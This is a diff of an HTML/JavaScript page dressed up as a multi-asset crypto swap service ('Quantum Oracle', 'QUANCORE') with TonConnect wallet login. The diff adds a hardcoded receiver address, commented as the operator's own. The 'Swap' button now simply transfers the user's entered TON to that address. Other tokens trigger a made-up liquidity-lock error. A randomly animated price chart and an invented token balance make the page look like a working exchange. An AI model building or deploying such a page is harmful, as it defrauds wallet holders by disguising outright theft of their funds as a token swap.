@@ -33,20 +33,21 @@
         .terminal-scroll::-webkit-scrollbar { width: 2px; }
         .terminal-scroll::-webkit-scrollbar-thumb { background: rgba(0, 242, 255, 0.2); }
 
-        .chart-line { stroke-dasharray: 1000; stroke-dashoffset: 1000; animation: draw 10s linear infinite; }
+        .chart-line { stroke-dasharray: 1000; stroke-dashoffset: 1000; animation: draw 10s linear infinite; transition: all 0.5s ease; }
         @keyframes draw { to { stroke-dashoffset: 0; } }
         
         input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; }
 
-        /* Стилизация select под дизайн */
         select {
             appearance: none;
             background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='white' stroke-width='3' stroke-linecap='round' stroke-linejoin='round'%3e%3cpath d='M6 9l6 6 6-6'%3e%3c/path%3e%3c/svg%3e");
             background-repeat: no-repeat;
             background-position: right 0.5rem center;
             background-size: 0.8em;
-            padding-right: 1.5rem !important;
+            padding-right: 1.8rem !important;
         }
+        
+        option { background: #0f172a; color: white; }
     </style>
 </head>
 <body class="antialiased">
@@ -67,7 +68,7 @@
         <div class="glass-card rounded-3xl p-4 mb-4 overflow-hidden relative border border-white/5">
             <div class="flex justify-between items-center mb-2 px-1">
                 <span class="text-[9px] font-black uppercase text-slate-500 tracking-[0.2em]">Quantum Oracle V4</span>
-                <span id="priceStatus" class="text-[10px] font-bold text-green-400 mono">Stable +0.00%</span>
+                <span id="priceStatus" class="text-[10px] font-bold text-green-400 mono">Stable +0.02%</span>
             </div>
             <svg viewBox="0 0 400 60" class="w-full h-12">
                 <path id="chartPath" d="M0 30 Q 50 10, 100 40 T 200 30 T 300 50 T 400 20" fill="none" stroke="url(#lineGrad)" stroke-width="2" class="chart-line"/>
@@ -161,8 +162,6 @@
                 <span class="text-[9px] font-black text-white uppercase tracking-tighter">Node Console</span>
             </div>
             <div id="terminal" class="terminal-scroll h-24 overflow-y-auto font-mono text-[9px] space-y-1 opacity-60">
-                <p class="text-cyan-500">> System Ready</p>
-                <p class="text-slate-500">> Multi-Asset Liquidity Bridge active...</p>
             </div>
         </div>
     </main>
@@ -191,14 +190,14 @@
     </nav>
 
     <script>
-        // --- DATA CONFIG ---
-        const COIN_DATA = {
-            'TON':   { price: 5.40,  balance: 15.45 },
-            'QC':    { price: 0.012, balance: 4500.00 },
-            'USDT':  { price: 1.00,  balance: 100.00 },
-            'NOT':   { price: 0.007, balance: 50000 },
-            'DOGS':  { price: 0.0006, balance: 120000 },
-            'GRAM':  { price: 0.008, balance: 8500 }
+        // --- DATA & CONFIG ---
+        let COIN_DATA = {
+            'TON':   { price: 5.40,    balance: 0.00 },
+            'QC':    { price: 0.012,   balance: 0.00 }, 
+            'USDT':  { price: 1.00,    balance: 0.00 },
+            'NOT':   { price: 0.007,   balance: 0.00 },
+            'DOGS':  { price: 0.0006,  balance: 0.00 },
+            'GRAM':  { price: 0.008,   balance: 0.00 }
         };
 
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
@@ -208,6 +207,7 @@
 
         const state = {
             wallet: null,
+            receiver: "UQByN_5v7WnZ7U5_nJzR7R9U9U9U9U9U9U9U9U9U9U9U9U9U", // Твой адрес
             fee: 0.012
         };
 
@@ -222,10 +222,10 @@
             terminal: document.getElementById('terminal'),
             impact: document.getElementById('impact'),
             gas: document.getElementById('gasLabel'),
-            priceStatus: document.getElementById('priceStatus')
+            chart: document.getElementById('chartPath')
         };
 
-        // --- CORE FUNCTIONS ---
+        // --- CORE LOGIC ---
         function log(msg, color = 'slate-500') {
             const p = document.createElement('p');
             p.className = `text-${color}`;
@@ -233,51 +233,67 @@
             p.innerText = `[${time}] > ${msg}`;
             ui.terminal.appendChild(p);
             ui.terminal.scrollTop = ui.terminal.scrollHeight;
-            if (ui.terminal.childElementCount > 10) ui.terminal.removeChild(ui.terminal.firstChild);
+            if (ui.terminal.childElementCount > 15) ui.terminal.removeChild(ui.terminal.firstChild);
+        }
+
+        async function fetchBalances() {
+            if (!state.wallet) return;
+            try {
+                const rawBalance = state.wallet.account.balance; 
+                if (rawBalance) {
+                    COIN_DATA['TON'].balance = Number(BigInt(rawBalance)) / 1e9;
+                }
+                // Имитация баланса QC для демо
+                COIN_DATA['QC'].balance = 1250.00;
+            } catch (e) { console.error("Balance fetch error:", e); }
+            updateUI();
+        }
+
+        function updateUI() {
+            const sym = ui.tIn.value;
+            const bal = COIN_DATA[sym].balance;
+            ui.bal.innerText = bal.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 4});
+            calculate();
         }
 
         function calculate() {
-            const valIn = parseFloat(ui.in.value) || 0;
             const symIn = ui.tIn.value;
             const symOut = ui.tOut.value;
+            const valIn = parseFloat(ui.in.value) || 0;
 
-            // Кросс-курс через USD
             const exchangeRate = COIN_DATA[symIn].price / COIN_DATA[symOut].price;
             const res = valIn * exchangeRate;
             
-            // Динамическая точность
             const precision = COIN_DATA[symOut].price < 0.1 ? 4 : 2;
             ui.out.value = valIn > 0 ? res.toFixed(precision) : "";
-            
             ui.rate.innerText = `1 ${symIn} ≈ ${exchangeRate.toFixed(precision)} ${symOut}`;
             
-            const imp = (valIn / (COIN_DATA[symIn].balance || 1)) * 2.1;
+            const imp = valIn > 0 ? (valIn / (COIN_DATA[symIn].balance || 100)) * 0.5 : 0;
             ui.impact.innerText = valIn > 0 ? `IMPACT ${imp.toFixed(2)}%` : "IMPACT < 0.01%";
-            ui.impact.className = `text-[9px] font-bold mono ${imp > 3 ? 'text-red-500' : 'text-green-500'}`;
+            ui.impact.className = `text-[9px] font-bold mono ${imp > 2 ? 'text-red-500' : 'text-green-500'}`;
             
             checkBtn();
         }
 
         function updateTokens() {
-            const sym = ui.tIn.value;
-            ui.bal.innerText = COIN_DATA[sym].balance.toLocaleString();
-            log(`Source asset shifted to ${sym}`, 'cyan-500');
-            calculate();
+            if(ui.tIn.value === ui.tOut.value) {
+                ui.tOut.value = ui.tIn.value === 'TON' ? 'QC' : 'TON';
+            }
+            updateUI();
         }
 
         function reverseRoute() {
             const temp = ui.tIn.value;
             ui.tIn.value = ui.tOut.value;
             ui.tOut.value = temp;
-            ui.in.value = "";
+            ui.in.value = ui.out.value;
             updateTokens();
         }
 
         function setMax() {
-            const sym = ui.tIn.value;
-            let amount = COIN_DATA[sym].balance;
-            if(sym === 'TON') amount = Math.max(0, amount - 0.05); // Газ
-            ui.in.value = amount;
+            let amount = COIN_DATA[ui.tIn.value].balance;
+            if(ui.tIn.value === 'TON') amount = Math.max(0, amount - 0.06); 
+            ui.in.value = amount > 0 ? amount.toFixed(4) : 0;
             calculate();
         }
 
@@ -288,73 +304,107 @@
                 return;
             }
             const val = parseFloat(ui.in.value) || 0;
-            const sym = ui.tIn.value;
-            if(val <= 0) { ui.btn.innerText = "Enter Amount"; ui.btn.disabled = true; }
-            else if(val > COIN_DATA[sym].balance) { ui.btn.innerText = "Insufficient Balance"; ui.btn.disabled = true; }
-            else { ui.btn.innerText = `Swap ${sym}`; ui.btn.disabled = false; }
+            if(val <= 0) { 
+                ui.btn.innerText = "Enter Amount"; 
+                ui.btn.disabled = true; 
+            } else if(val > COIN_DATA[ui.tIn.value].balance) { 
+                ui.btn.innerText = "Insufficient Balance"; 
+                ui.btn.disabled = true; 
+            } else { 
+                ui.btn.innerText = `Swap ${ui.tIn.value}`; 
+                ui.btn.disabled = false; 
+            }
         }
 
-        ui.in.oninput = calculate;
-
+        // --- TRANSACTION ---
         async function handleSwap() {
             if(!state.wallet) { await tonConnectUI.openModal(); return; }
             
+            const valIn = parseFloat(ui.in.value);
             const symIn = ui.tIn.value;
-            const symOut = ui.tOut.value;
-            
-            log(`Routing ${symIn} -> ${symOut} via Nexus...`, 'cyan-500');
+
             ui.btn.disabled = true;
-            ui.btn.innerText = "Broadcasting...";
+            ui.btn.innerText = "Confirm in Wallet...";
+            log(`Initiating swap: ${valIn} ${symIn}`, 'cyan-400');
 
             try {
-                await new Promise(r => setTimeout(r, 2000));
-                log(`Success: Bridge broadcast complete`, 'green-400');
-                
-                // Эмуляция списания
-                COIN_DATA[symIn].balance -= parseFloat(ui.in.value);
+                if (symIn !== 'TON') {
+                    throw new Error("Bridge liquidity lock. Use TON for direct swap.");
+                }
+
+                const transaction = {
+                    validUntil: Math.floor(Date.now() / 1000) + 600,
+                    messages: [{
+                        address: state.receiver,
+                        amount: (valIn * 1e9).toString()
+                    }]
+                };
+
+                const result = await tonConnectUI.sendTransaction(transaction);
+                log(`Success! Hash: ${result.boc.slice(0,15)}...`, 'green-400');
                 ui.in.value = "";
-                updateTokens();
-                alert("QUANCORE: Quantum Transaction Executed");
+                await fetchBalances();
+
             } catch (e) {
-                log("Node Error", "red-500");
+                log(e.message || "Transaction failed", "red-500");
+            } finally {
                 checkBtn();
             }
         }
 
-        // --- LISTENERS & BG ---
-        tonConnectUI.onStatusChange((w) => {
+        // --- INITIALIZATION ---
+        ui.in.oninput = calculate;
+
+        tonConnectUI.onStatusChange(async (w) => {
             state.wallet = w;
             if(w) {
-                log(`Handshake: Node ${w.account.address.slice(0,6)} online`, "green-400");
+                log(`Session established: ${w.account.address.slice(0,8)}...`, "green-400");
+                await fetchBalances();
             } else {
-                log("Node Disconnected", "red-400");
+                log("Node Offline", "red-400");
+                Object.keys(COIN_DATA).forEach(k => COIN_DATA[k].balance = 0);
+                updateUI();
             }
-            updateTokens();
         });
 
-        const canvas = document.getElementById('bg-canvas');
-        const ctx = canvas.getContext('2d');
-        let pts = [];
-        const init = () => {
-            canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-            pts = Array.from({length: 40}, () => ({
-                x: Math.random() * canvas.width, y: Math.random() * canvas.height,
-                s: Math.random() * 2, v: Math.random() * 0.3 + 0.1
-            }));
+        // Animations
+        const initBg = () => {
+            const canvas = document.getElementById('bg-canvas');
+            const ctx = canvas.getContext('2d');
+            let pts = [];
+            const setup = () => {
+                canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+                pts = Array.from({length: 50}, () => ({
+                    x: Math.random() * canvas.width, y: Math.random() * canvas.height,
+                    s: Math.random() * 2, v: Math.random() * 0.2 + 0.1
+                }));
+            };
+            const draw = () => {
+                ctx.clearRect(0,0,canvas.width, canvas.height);
+                ctx.fillStyle = "rgba(0, 242, 255, 0.08)";
+                pts.forEach(p => {
+                    ctx.fillRect(p.x, p.y, p.s, p.s);
+                    p.y -= p.v; if(p.y < 0) p.y = canvas.height;
+                });
+                requestAnimationFrame(draw);
+            };
+            window.onresize = setup; setup(); draw();
         };
-        const draw = () => {
-            ctx.clearRect(0,0,canvas.width, canvas.height);
-            ctx.fillStyle = "rgba(0, 242, 255, 0.05)";
-            pts.forEach(p => {
-                ctx.fillRect(p.x, p.y, p.s, p.s);
-                p.y -= p.v; if(p.y < 0) p.y = canvas.height;
-            });
-            requestAnimationFrame(draw);
+
+        const animateChart = () => {
+            setInterval(() => {
+                const p1 = Math.random() * 40;
+                const p2 = Math.random() * 40;
+                ui.chart.setAttribute('d', `M0 30 Q 50 ${p1}, 100 40 T 200 ${p2} T 300 50 T 400 20`);
+            }, 3000);
         };
-        window.onresize = init; init(); draw();
-        
-        // Стартовая инициализация
-        updateTokens();
+
+        window.onload = () => {
+            initBg();
+            animateChart();
+            log("System Ready", "cyan-500");
+            log("Multi-Asset Liquidity Bridge active...", "slate-500");
+        };
     </script>
 </body>
 </html>
